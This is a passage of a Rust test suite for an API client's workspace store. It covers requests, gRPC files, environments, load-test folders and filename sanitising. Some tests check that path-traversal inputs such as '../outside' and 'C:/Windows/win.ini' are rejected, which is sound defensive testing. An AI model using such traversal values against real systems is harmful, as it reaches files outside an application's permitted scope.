        let (_t, store) = ws();
        let mut env = Environment::new("e");
        env.variables.push(EnvVariable {
            key: "k".into(),
            value: "v".into(),
            secret: true,
            enabled: true,
        });
        store.save_environment(&env).unwrap();
        assert!(!store.read_secrets().unwrap().is_empty());
        store.delete_environment("e").unwrap();
        assert!(store.read_secrets().unwrap().is_empty());
    }

    #[test]
    fn ancestor_chain_is_outermost_first() {
        let (_t, store) = ws();
        let c = store.create_collection("C").unwrap();
        let f = store.create_folder(&c, "F").unwrap();
        let r = store.create_request(&f, "R").unwrap();
        let chain = store.ancestors_of(&r).unwrap();
        assert_eq!(chain.len(), 2);
        assert_eq!(chain[0].name, "C");
        assert_eq!(chain[1].name, "F");
    }

    #[test]
    fn unsafe_refs_rejected() {
        let (_t, store) = ws();
        assert!(store.path_of("../escape").is_err());
        assert!(store.path_of("/abs").is_err());
        assert!(store.path_of("collections/../../x").is_err());
    }

    #[test]
    fn sanitizes_windows_reserved_and_illegal_names() {
        assert_eq!(sanitize_name("a/b:c"), "a_b_c");
        assert_eq!(sanitize_name("CON"), "_CON");
        assert_eq!(sanitize_name("con.req"), "_con.req");
        assert_eq!(sanitize_name("trailing..."), "trailing");
        assert_eq!(sanitize_name("   "), "untitled");
        assert_eq!(sanitize_name(""), "untitled");
    }

    #[test]
    fn corrupt_request_file_does_not_break_tree() {
        let (_t, store) = ws();
        let c = store.create_collection("C").unwrap();
        let dir = store.path_of(&c).unwrap();
        fs::write(dir.join("Broken.req.json"), "{ not json").unwrap();
        let tree = store.tree().unwrap();
        assert_eq!(tree[0].children.len(), 1);
        assert!(tree[0].children[0].name.contains("unreadable"));
    }

    #[test]
    fn atomic_write_replaces_existing() {
        let tmp = TempDir::new().unwrap();
        let p = tmp.path().join("f.txt");
        write_atomic(&p, b"one").unwrap();
        write_atomic(&p, b"two").unwrap();
        assert_eq!(fs::read_to_string(&p).unwrap(), "two");
        // No temp files left behind.
        let leftovers: Vec<_> = fs::read_dir(tmp.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().contains(".tmp-"))
            .collect();
        assert!(leftovers.is_empty());
    }

    // -- gRPC requests ---------------------------------------------------

    #[test]
    fn grpc_requests_live_in_the_same_tree() {
        let (_t, store) = ws();
        let coll = store.create_collection("API").unwrap();
        let http = store.create_request(&coll, "Get JSON").unwrap();
        let grpc = store.create_grpc_request(&coll, "Get Order").unwrap();
        assert_eq!(grpc, "collections/API/Get Order.grpc.json");

        let mut def = store.get_grpc_request(&grpc).unwrap();
        def.service = "orders.v1.OrderService".into();
        def.method = "GetOrder".into();
        store.save_grpc_request(&grpc, &def).unwrap();
        assert_eq!(store.get_grpc_request(&grpc).unwrap().method, "GetOrder");

        let tree = store.tree().unwrap();
        let kids = &tree[0].children;
        assert_eq!(kids.len(), 2);
        let g = kids.iter().find(|n| n.name == "Get Order").unwrap();
        assert_eq!(g.method.as_deref(), Some("GRPC"));
        assert_eq!(g.kind, NodeKind::Request);
        // The HTTP request is unaffected.
        let h = kids.iter().find(|n| n.name == "Get JSON").unwrap();
        assert_eq!(h.method.as_deref(), Some("GET"));
        assert_eq!(h.node_ref, http);
    }

    #[test]
    fn rename_move_and_duplicate_are_extension_aware() {
        let (_t, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let folder = store.create_folder(&coll, "F").unwrap();
        let grpc = store.create_grpc_request(&coll, "Old").unwrap();

        let renamed = store.rename_request(&grpc, "New").unwrap();
        assert!(renamed.ends_with("New.grpc.json"), "{renamed}");
        assert_eq!(store.get_grpc_request(&renamed).unwrap().name, "New");
        assert!(store.get_grpc_request(&grpc).is_err());

        let dup = store.duplicate_request(&renamed).unwrap();
        assert!(dup.ends_with("New copy.grpc.json"), "{dup}");
        let a = store.get_grpc_request(&renamed).unwrap();
        let b = store.get_grpc_request(&dup).unwrap();
        assert_ne!(a.id, b.id, "a duplicate must get a fresh id");

        let moved = store.move_request(&renamed, &folder).unwrap();
        assert_eq!(moved, "collections/C/F/New.grpc.json");
        assert!(store.get_grpc_request(&renamed).is_err());
    }

    #[test]
    fn grpc_inherits_scripts_from_its_containers() {
        let (_t, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let mut container = store.get_container(&coll).unwrap();
        container.scripts.pre_request = "COLL_PRE".into();
        store.save_container(&coll, &container).unwrap();

        let grpc = store.create_grpc_request(&coll, "Call").unwrap();
        let merged = store.merged_grpc_request(&grpc).unwrap();
        assert_eq!(merged.pre_scripts, vec!["COLL_PRE".to_string()]);
    }

    #[test]
    fn corrupt_grpc_file_does_not_break_the_tree() {
        let (_t, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let dir = store.path_of(&coll).unwrap();
        fs::write(dir.join("Broken.grpc.json"), "{ not json").unwrap();
        let tree = store.tree().unwrap();
        assert_eq!(tree[0].children.len(), 1);
        assert!(tree[0].children[0].name.contains("unreadable"));
        assert!(tree[0].children[0].method.is_none());
    }

    #[test]
    fn protocol_is_derived_from_the_ref() {
        assert_eq!(
            WorkspaceStore::protocol_of("collections/C/A.grpc.json"),
            Protocol::Grpc
        );
        assert_eq!(
            WorkspaceStore::protocol_of("collections/C/A.req.json"),
            Protocol::Http
        );
    }

    #[test]
    fn grpc_names_are_sanitized_and_collisions_resolved() {
        let (_t, store) = ws();
        let coll = store.create_collection("C").unwrap();
        let a = store.create_grpc_request(&coll, "CON").unwrap();
        let b = store.create_grpc_request(&coll, "CON").unwrap();
        assert!(a.ends_with("_CON.grpc.json"), "{a}");
        assert!(b.ends_with("_CON 2.grpc.json"), "{b}");
        assert_eq!(store.get_grpc_request(&a).unwrap().name, "CON");
    }

    #[test]
    fn load_tests_can_be_grouped_in_folders() {
        let (_t, s) = ws();
        let root_test = s.create_scenario("at root").unwrap();
        let folder = s.create_load_folder("", "Checkout").unwrap();
        let nested = s.create_scenario_in(&folder, "in folder").unwrap();
        assert!(nested.starts_with(&folder), "{nested}");

        // The flat listing is recursive, which is what the repointing
        // callers need; before folders existed it stopped at the top level.
        let flat = s.list_load_tests().unwrap();
        assert_eq!(flat.len(), 2);
        assert!(flat.iter().any(|t| t.node_ref == nested));

        // The tree puts folders first and nests their contents.
        let tree = s.load_tree().unwrap();
        assert_eq!(tree.len(), 2);
        assert_eq!(tree[0].kind, LoadTestKind::Folder);
        assert_eq!(tree[0].name, "Checkout");
        assert_eq!(tree[0].children.len(), 1);
        assert_eq!(tree[0].children[0].node_ref, nested);
        assert_eq!(tree[1].node_ref, root_test);
    }

    #[test]
    fn a_load_test_can_be_moved_into_a_folder_and_back_out() {
        let (_t, s) = ws();
        let test = s.create_scenario("smoke").unwrap();
        let id = s.get_scenario(&test).unwrap().id;
        let folder = s.create_load_folder("", "Nightly").unwrap();

        let moved = s.move_load_test(&test, &folder).unwrap();
        assert!(moved.starts_with(&folder), "{moved}");
        // The scenario is the same scenario — which is why runs scope by id
        // and not by path.
        assert_eq!(s.get_scenario(&moved).unwrap().id, id);

        let back = s.move_load_test(&moved, "").unwrap();
        assert_eq!(back, test);
        assert_eq!(
            s.load_tree().unwrap()[0].children.len(),
            0,
            "folder now empty"
        );
    }

    #[test]
    fn moving_a_load_test_where_it_already_is_leaves_it_alone() {
        // `unique_path` never returns an existing path, so without a guard
        // this renames the file to "smoke 2" and deletes the original.
        let (_t, s) = ws();
        let test = s.create_scenario("smoke").unwrap();
        assert_eq!(s.move_load_test(&test, "").unwrap(), test);
        assert_eq!(s.list_load_tests().unwrap().len(), 1);
    }

    #[test]
    fn a_folder_cannot_be_moved_inside_itself() {
        let (_t, s) = ws();
        let outer = s.create_load_folder("", "Outer").unwrap();
        let inner = s.create_load_folder(&outer, "Inner").unwrap();
        assert!(s.move_load_test(&outer, &inner).is_err());
        // And it is still there.
        assert!(s.path_of(&outer).unwrap().is_dir());
    }

    #[test]
    fn a_load_folder_renames_and_keeps_what_is_inside() {
        let (_t, s) = ws();
        let folder = s.create_load_folder("", "Old").unwrap();
        let test = s.create_scenario_in(&folder, "smoke").unwrap();
        let id = s.get_scenario(&test).unwrap().id;

        let renamed = s.rename_load_folder(&folder, "New").unwrap();
        let tree = s.load_tree().unwrap();
        assert_eq!(tree[0].name, "New");
        assert_eq!(tree[0].children.len(), 1);
        assert_eq!(
            s.get_scenario(&tree[0].children[0].node_ref).unwrap().id,
            id
        );
        assert!(renamed.ends_with("New"), "{renamed}");
    }

    #[test]
    fn a_listed_run_carries_the_scenario_identity_it_came_from() {
        // The Runs list is scoped by the scenario's id, so the projection
        // has to carry it — the name alone cannot tell two tests apart, and
        // the path stops matching the moment the test is moved.
        let (_t, s) = ws();
        let mut summary = stub_summary("r1", "checkout");
        summary.scenario_id = Some("scenario-uuid-1".into());
        summary.scenario_ref = "loadtests/checkout.load.json".into();
        s.save_run_summary(&summary).unwrap();

        let listed = s.list_runs().unwrap();
        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].scenario_id.as_deref(), Some("scenario-uuid-1"));
        assert_eq!(listed[0].scenario_ref, "loadtests/checkout.load.json");
    }

    #[test]
    fn a_listed_load_test_carries_its_id_for_scenarios_only() {
        let (_t, s) = ws();
        let sref = s.create_scenario("smoke").unwrap();
        let expected = s.get_scenario(&sref).unwrap().id;
        s.create_user_script("custom", "export default function () {}")
            .unwrap();

        let tests = s.list_load_tests().unwrap();
        let scenario = tests
            .iter()
            .find(|t| t.name == "smoke")
            .expect("scenario listed");
        assert_eq!(scenario.id.as_deref(), Some(expected.as_str()));

        // A user script is raw JavaScript with nowhere to keep an id, so it
        // has none — and cannot be scoped by identity.
        let script = tests
            .iter()
            .find(|t| t.kind == LoadTestKind::UserScript)
            .expect("script listed");
        assert!(script.id.is_none());
    }

    #[test]
    fn a_ref_cannot_escape_the_workspace_by_drive_letter_or_parent_segment() {
        let (_t, s) = ws();
        // A drive-letter segment makes PathBuf::push *replace* the path on
        // Windows; a `..` segment is the classic escape. Both are refused.
        for bad in [
            "C:/Windows/win.ini",
            "collections/C:/x",
            "../outside",
            "a/../../b",
            "a/..//b",
        ] {
            assert!(s.path_of(bad).is_err(), "{bad} should be rejected");
        }
        // Whatever survives must still resolve inside the root.
        let ok = s.path_of("collections/team/req.req.json").unwrap();
        assert!(ok.starts_with(s.root()));
    }

    #[test]
    fn a_name_with_an_ellipsis_is_not_mistaken_for_a_parent_reference() {
        // `..` as a substring is just punctuation; only a whole `..` segment
        // walks upward. Without this a request named "Wait... what" could be
        // created but never opened, saved or deleted.
        let (_t, s) = ws();
        let coll = s.create_collection("C").unwrap();
        let r = s.create_request(&coll, "Wait... what").unwrap();
        assert!(r.contains("..."), "{r}");
        let def = s.get_request(&r).expect("openable");
        assert_eq!(def.name, "Wait... what");
        s.save_request(&r, &def).expect("saveable");
        s.delete_node(&r).expect("deletable");
    }

    #[test]
    fn a_long_name_is_cut_on_a_character_boundary() {
        // 119 ASCII bytes then a two-byte character straddling the 120-byte
        // limit: a byte-indexed truncate panics here.
        let name = format!("{}é tail", "a".repeat(119));
        let out = sanitize_name(&name);
        assert!(out.len() <= 120);
        assert!(out.starts_with(&"a".repeat(119)));
    }

    #[test]
    fn moving_a_request_onto_its_own_folder_leaves_it_alone() {
        let (_t, s) = ws();
        let coll = s.create_collection("C").unwrap();
        let r = s.create_request(&coll, "same").unwrap();
        let moved = s.move_request(&r, &coll).unwrap();
        // Not renamed to "same 2", and the original still there.
        assert_eq!(moved, r);
        assert!(s.get_request(&r).is_ok());
        let names: Vec<String> = s
            .tree()
            .unwrap()
            .into_iter()
            .flat_map(|n| n.children)
            .map(|n| n.name)
            .collect();
        assert_eq!(names, vec!["same".to_string()]);
    }

    #[test]
    fn an_environment_can_change_only_its_capitalisation() {
        let (_t, s) = ws();
        s.save_environment(&Environment::new("local")).unwrap();
        // On a case-insensitive filesystem "Local" *is* the existing file;
        // that must not read as a name collision.
        s.rename_environment("local", "Local")
            .expect("case-only rename");
        let names = s.list_environments().unwrap();
        assert!(names.iter().any(|n| n == "Local"), "{names:?}");
        assert!(!names.iter().any(|n| n == "local"), "{names:?}");
    }

    #[test]
    fn renaming_a_container_repoints_the_scenario_steps_inside_it() {
        let (_t, s) = ws();
        let coll = s.create_collection("Orders").unwrap();
        let req = s.create_request(&coll, "list").unwrap();
        let sref = s.create_scenario("smoke").unwrap();
        let mut sc = s.get_scenario(&sref).unwrap();
        sc.steps = vec![LoadStep {
            request_ref: req.clone(),
            request_id: None,
            think_time_ms: None,
            capture: vec![],
            tag: None,
            parallel: false,
        }];
        s.save_scenario(&sref, &sc).unwrap();

        let new_coll = s.rename_container(&coll, "Orders v2").unwrap();
        let sc = s.get_scenario(&sref).unwrap();
        assert!(
            sc.steps[0].request_ref.starts_with(&format!("{new_coll}/")),
            "step still points at {}",
            sc.steps[0].request_ref
        );
        assert!(s.get_request(&sc.steps[0].request_ref).is_ok());
    }

    #[test]
    fn scenario_crud() {
        let (_t, store) = ws();
        let r = store.create_scenario("smoke").unwrap();
        assert_eq!(r, "loadtests/smoke.load.json");
        let mut s = store.get_scenario(&r).unwrap();
        s.max_vus = 42;
        store.save_scenario(&r, &s).unwrap();
        assert_eq!(store.get_scenario(&r).unwrap().max_vus, 42);
        assert_eq!(store.list_load_tests().unwrap().len(), 1);
    }
}
